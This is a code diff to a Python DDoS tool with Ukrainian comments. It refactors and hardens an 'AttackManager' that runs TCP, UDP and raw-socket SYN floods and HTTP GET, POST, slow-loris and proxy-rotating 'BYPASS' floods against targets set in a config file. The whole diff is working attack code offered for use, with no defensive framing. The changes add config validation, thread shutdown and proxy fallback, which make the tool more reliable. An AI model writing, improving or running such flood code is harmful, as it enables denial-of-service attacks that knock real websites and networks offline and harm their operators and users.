@@ -16,10 +16,15 @@ import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
 from pathlib import Path
-from typing import Dict, List, Optional, Set, Tuple
+from typing import Dict, List, Optional, Set, Tuple, Union
 
 from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
 from PyRoxy import Tools as ProxyTools
+
+L4_METHODS = frozenset({"TCP", "UDP", "SYN"})
+L7_METHODS = frozenset({"GET", "POST", "STRESS", "SLOW", "GSB", "BYPASS"})
+ALL_METHODS = L4_METHODS | L7_METHODS
+
 from impacket.ImpactPacket import IP, TCP
 from requests import Session, get
 from yarl import URL
@@ -34,10 +39,93 @@ logger.setLevel(logging.INFO)
 # ----------------------------------------------------------------------
 # Завантаження JSON
 # ----------------------------------------------------------------------
-def load_json_safe(filepath: Path) -> dict | list:
+def load_json_safe(filepath: Path) -> Union[dict, list]:
     raw = filepath.read_text(encoding="utf-8")
-    clean = re.sub(r',\s*([}\]])', r'\1', raw)
-    return json.loads(clean)
+    try:
+        return json.loads(raw)
+    except json.JSONDecodeError:
+        clean = re.sub(r',\s*([}\]])', r'\1', raw)
+        return json.loads(clean)
+
+
+def validate_config(config: dict) -> None:
+    if not isinstance(config, dict):
+        raise ValueError("config must be a JSON object")
+    targets = config.get("targets")
+    if not isinstance(targets, list) or not targets:
+        raise ValueError("config must include a non-empty 'targets' list")
+    settings = config.get("settings", {})
+    if settings is not None and not isinstance(settings, dict):
+        raise ValueError("'settings' must be an object")
+    for key in ("threads", "rpc"):
+        val = settings.get(key, 100 if key == "threads" else 1)
+        if not isinstance(val, int) or val < 1:
+            raise ValueError(f"settings.{key} must be a positive integer")
+    if settings.get("proxy", 0) not in (0, 1):
+        raise ValueError("settings.proxy must be 0 or 1")
+    for i, target in enumerate(targets):
+        if not isinstance(target, dict):
+            raise ValueError(f"targets[{i}] must be an object")
+        method = target.get("method")
+        if not method or not isinstance(method, str):
+            raise ValueError(f"targets[{i}] requires a 'method' string")
+        method = method.upper()
+        if method not in ALL_METHODS:
+            raise ValueError(f"targets[{i}] has unsupported method '{method}'")
+        target_str = target.get("target")
+        if not target_str or not isinstance(target_str, str):
+            raise ValueError(f"targets[{i}] requires a 'target' string")
+        for key in ("threads", "rpc"):
+            if key in target:
+                val = target[key]
+                if not isinstance(val, int) or val < 1:
+                    raise ValueError(f"targets[{i}].{key} must be a positive integer")
+        if "proxy" in target and target["proxy"] not in (0, 1):
+            raise ValueError(f"targets[{i}].proxy must be 0 or 1")
+        if method in L7_METHODS:
+            url = URL(target_str)
+            if url.scheme not in ("http", "https") or not url.host:
+                raise ValueError(f"targets[{i}] must be an http(s) URL")
+        else:
+            parse_l4_target(target_str)
+
+
+def parse_l4_target(target_str: str) -> Tuple[str, int]:
+    if "://" in target_str:
+        _, rest = target_str.split("://", 1)
+    else:
+        rest = target_str
+    if rest.startswith("["):
+        if "]:" not in rest:
+            raise ValueError(f"invalid Layer 4 target (expected [host]:port): {target_str}")
+        host, port_part = rest.split("]:", 1)
+        ip_part = host + "]"
+    elif ":" in rest:
+        ip_part, port_part = rest.rsplit(":", 1)
+    else:
+        ip_part, port_part = rest, "80"
+    try:
+        port = int(port_part)
+    except ValueError as exc:
+        raise ValueError(f"invalid port in target '{target_str}'") from exc
+    if not 1 <= port <= 65535:
+        raise ValueError(f"port out of range in target '{target_str}'")
+    return ip_part, port
+
+
+def validate_proxy_providers(proxy_providers: list) -> None:
+    if not isinstance(proxy_providers, list):
+        raise ValueError("proxy.json must be a JSON array")
+    for i, provider in enumerate(proxy_providers):
+        if not isinstance(provider, dict):
+            raise ValueError(f"proxy.json[{i}] must be an object")
+        if not provider.get("url"):
+            raise ValueError(f"proxy.json[{i}] requires a 'url'")
+
+
+def l7_stats_key(url: URL) -> str:
+    return url.authority or url.host or str(url)
+
 
 # ----------------------------------------------------------------------
 # Утиліти
@@ -66,9 +154,12 @@ class Tools:
 
     @staticmethod
     def sizeOfRequest(res) -> int:
-        size = len(res.request.method)
-        size += len(res.request.url)
+        size = len(res.request.method or "")
+        size += len(res.request.url or "")
         size += len('\r\n'.join(f'{k}: {v}' for k, v in res.request.headers.items()))
+        if res.request.body:
+            size += len(res.request.body)
+        size += len(res.content or b"")
         return size
 
 # ----------------------------------------------------------------------
@@ -87,14 +178,18 @@ class Layer4(threading.Thread):
         self.stats_lock = stats_lock
         self.methods = {"UDP": self.UDP, "SYN": self.SYN, "TCP": self.TCP}
 
+    def _running(self) -> bool:
+        return self._synevent is None or self._synevent.is_set()
+
     def run(self):
-        if self._synevent: self._synevent.wait()
+        if self._synevent:
+            self._synevent.wait()
         self.select(self._method)
-        while self._synevent.is_set():
+        while self._running():
             self.SENT_FLOOD()
 
     def _update_stats(self, bytes_sent: int):
-        if self.stats_dict is not None and self.target_key:
+        if self.stats_dict is not None and self.target_key and self.stats_lock:
             with self.stats_lock:
                 if self.target_key not in self.stats_dict:
                     self.stats_dict[self.target_key] = [0, 0]
@@ -106,7 +201,7 @@ class Layer4(threading.Thread):
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.settimeout(.9)
             s.connect(self._target)
-            while True:
+            while self._running():
                 data = random.randbytes(1024)
                 if s.send(data):
                     self._update_stats(len(data))
@@ -115,7 +210,7 @@ class Layer4(threading.Thread):
 
     def UDP(self):
         with suppress(Exception), socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-            while True:
+            while self._running():
                 data = random.randbytes(1024)
                 if s.sendto(data, self._target):
                     self._update_stats(len(data))
@@ -125,7 +220,7 @@ class Layer4(threading.Thread):
     def SYN(self):
         with suppress(Exception), socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
             s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-            while True:
+            while self._running():
                 pkt = self._genrate_syn()
                 if s.sendto(pkt, self._target):
                     self._update_stats(len(pkt))
@@ -187,8 +282,7 @@ class HttpFlood(threading.Thread):
                 "https://drive.google.com/viewerng/viewer?url=",
             ]
         self._referers = list(referers)
-        if proxies:
-            self._proxies = list(proxies)
+        self._proxies = list(proxies) if proxies else []
 
         if not useragents:
             useragents = [
@@ -212,13 +306,21 @@ class HttpFlood(threading.Thread):
             'Upgrade-Insecure-Requests: 1\r\n'
         )
 
+    def _running(self) -> bool:
+        return self._synevent is None or self._synevent.is_set()
+
     def _update_stats(self, bytes_sent: int):
-        if self.stats_dict is not None and self.target_key:
+        if self.stats_dict is not None and self.target_key and self.stats_lock:
             with self.stats_lock:
                 if self.target_key not in self.stats_dict:
                     self.stats_dict[self.target_key] = [0, 0]
                 self.stats_dict[self.target_key][0] += 1
                 self.stats_dict[self.target_key][1] += bytes_sent
+
+    def _pick_proxy(self) -> Optional[Proxy]:
+        if self._proxies:
+            return random.choice(self._proxies)
+        return None
 
     def select(self, name: str):
         self.SENT_FLOOD = self.GET
@@ -226,9 +328,10 @@ class HttpFlood(threading.Thread):
             self.SENT_FLOOD = self.methods[name]
 
     def run(self):
-        if self._synevent: self._synevent.wait()
+        if self._synevent:
+            self._synevent.wait()
         self.select(self._method)
-        while self._synevent.is_set():
+        while self._running():
             self.SENT_FLOOD()
 
     @property
@@ -246,8 +349,9 @@ class HttpFlood(threading.Thread):
                           (other or "") + "\r\n")
 
     def open_connection(self, host=None):
-        if self._proxies:
-            sock = random.choice(self._proxies).open_socket(socket.AF_INET, socket.SOCK_STREAM)
+        proxy = self._pick_proxy()
+        if proxy:
+            sock = proxy.open_socket(socket.AF_INET, socket.SOCK_STREAM)
         else:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
@@ -281,6 +385,8 @@ class HttpFlood(threading.Thread):
         payload = self.generate_payload()
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
+                if not self._running():
+                    break
                 if s.send(payload):
                     self._update_stats(len(payload))
 
@@ -292,6 +398,8 @@ class HttpFlood(threading.Thread):
         )[:-2]
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
+                if not self._running():
+                    break
                 if s.send(payload):
                     self._update_stats(len(payload))
 
@@ -303,13 +411,18 @@ class HttpFlood(threading.Thread):
         )[:-2]
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
+                if not self._running():
+                    break
                 if s.send(payload):
                     self._update_stats(len(payload))
 
     def BYPASS(self):
-        pro = random.choice(self._proxies).asRequest() if self._proxies else None
+        proxy = self._pick_proxy()
+        pro = proxy.asRequest() if proxy else None
         with suppress(Exception), Session() as s:
             for _ in range(self._rpc):
+                if not self._running():
+                    break
                 resp = s.get(self._target.human_repr(), proxies=pro) if pro else s.get(self._target.human_repr())
                 self._update_stats(Tools.sizeOfRequest(resp))
 
@@ -327,15 +440,15 @@ class HttpFlood(threading.Thread):
         payload = self.generate_payload()
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
+                if not self._running():
+                    break
                 if s.send(payload):
                     self._update_stats(len(payload))
-            while s.send(payload) and s.recv(1):
-                for _ in range(self._rpc):
-                    keep = f"X-a: {ProxyTools.Random.rand_int(1, 5000)}\r\n".encode()
-                    if s.send(keep):
-                        self._update_stats(len(keep))
-                    time.sleep(self._rpc / 15)
-                    break
+            while self._running() and s.send(payload) and s.recv(1):
+                keep = f"X-a: {ProxyTools.Random.rand_int(1, 5000)}\r\n".encode()
+                if s.send(keep):
+                    self._update_stats(len(keep))
+                time.sleep(self._rpc / 15)
 
 # ----------------------------------------------------------------------
 # Проксі-менеджер
@@ -488,20 +601,51 @@ class AttackManager:
         self.target_stats: Dict[str, List[int]] = {}
         self.stats_lock = threading.Lock()
         self._proxy_list: Optional[List[Proxy]] = None
-        self._proxies_loaded = False
+        self._proxy_fetch_attempted = False
         self.target_keys: List[str] = []
         self.table_height = 0
 
     def _load_proxies_if_needed(self, proxy_enabled: int, check_url: str) -> Optional[List[Proxy]]:
         if proxy_enabled == 0:
             return None
-        if not self._proxies_loaded:
-            self._proxy_list = ProxyManager.get_proxies(self.proxy_providers, check_url)
-            self._proxies_loaded = True
-        return self._proxy_list
+        if self._proxy_list is not None:
+            return self._proxy_list or None
+        if self._proxy_fetch_attempted:
+            return None
+        self._proxy_fetch_attempted = True
+        self._proxy_list = ProxyManager.get_proxies(self.proxy_providers, check_url) or []
+        if not self._proxy_list:
+            logger.warning("Proxy enabled but no working proxies found; using direct connections.")
+        return self._proxy_list or None
+
+    def _join_workers(self, timeout: float = 5.0) -> None:
+        deadline = time.time() + timeout
+        for worker in self.threads:
+            remaining = max(0.01, deadline - time.time())
+            if worker.is_alive():
+                worker.join(timeout=remaining)
+        self.threads.clear()
+
+    def _preview_target_keys(self) -> List[str]:
+        keys = []
+        for target in self.config.get("targets", []):
+            method = target["method"].upper()
+            target_str = target["target"]
+            if method in L4_METHODS:
+                ip_part, port = parse_l4_target(target_str)
+                keys.append(f"{target.get('ip') or ip_part}:{port}")
+            else:
+                keys.append(l7_stats_key(URL(target_str)))
+        seen = set()
+        unique = []
+        for key in keys:
+            if key not in seen:
+                seen.add(key)
+                unique.append(key)
+        return unique
 
     def _spawn_threads(self):
-        self.threads.clear()
+        self._join_workers()
         target_keys = []
 
         settings = self.config.get("settings", {})
@@ -525,16 +669,8 @@ class AttackManager:
             rpc = target.get("rpc", default_rpc)
             proxy_enabled = target.get("proxy", default_proxy)
 
-            if method in ("TCP", "UDP", "SYN"):
-                if "://" in target_str:
-                    _, rest = target_str.split("://", 1)
-                else:
-                    rest = target_str
-                if ":" in rest:
-                    ip_part, port_part = rest.rsplit(":", 1)
-                else:
-                    ip_part, port_part = rest, "80"
-                port = int(port_part)
+            if method in L4_METHODS:
+                ip_part, port = parse_l4_target(target_str)
                 actual_ip = ip if ip else socket.gethostbyname(ip_part)
                 key = f"{actual_ip}:{port}"
                 target_keys.append(key)
@@ -546,7 +682,7 @@ class AttackManager:
                 url = URL(target_str)
                 hostname = url.host
                 actual_ip = ip if ip else socket.gethostbyname(hostname)
-                key = url.host
+                key = l7_stats_key(url)
                 target_keys.append(key)
                 proxies = self._load_proxies_if_needed(proxy_enabled, str(url))
                 for thread_id in range(threads):
@@ -572,6 +708,14 @@ class AttackManager:
         needed = len(self.target_keys) + 4
         max_table = max(5, min(needed, term_height - 2))
         return max_table
+
+    def setup_console(self) -> None:
+        self.target_keys = self._preview_target_keys()
+        self.table_height = self._calculate_table_height()
+        sys.stdout.write("\033[2J\033[H")
+        for _ in range(self.table_height):
+            print()
+        print("Type start/stop/exit")
 
     def start(self):
         if self.event.is_set():
@@ -608,14 +752,16 @@ class AttackManager:
             logger.warning("Attack not running.")
             return
         self.event.clear()
-        time.sleep(0.2)
+        self._join_workers()
+        if self.monitor_thread and self.monitor_thread.is_alive():
+            self.monitor_thread.join(timeout=1.0)
         logger.info("Attack stopped.")
 
 # ----------------------------------------------------------------------
 # Консоль
 # ----------------------------------------------------------------------
 def console(manager: AttackManager):
-    manager.start()
+    manager.setup_console()
 
     while True:
         prompt_row = manager.table_height + 1
@@ -655,8 +801,14 @@ def main():
         print("Error: proxy.json not found")
         sys.exit(1)
 
-    config = load_json_safe(config_path)
-    proxy_providers = load_json_safe(proxy_path)
+    try:
+        config = load_json_safe(config_path)
+        proxy_providers = load_json_safe(proxy_path)
+        validate_config(config)
+        validate_proxy_providers(proxy_providers)
+    except (json.JSONDecodeError, ValueError) as exc:
+        print(f"Configuration error: {exc}")
+        sys.exit(1)
 
     mgr = AttackManager(config, proxy_providers)
     console(mgr)
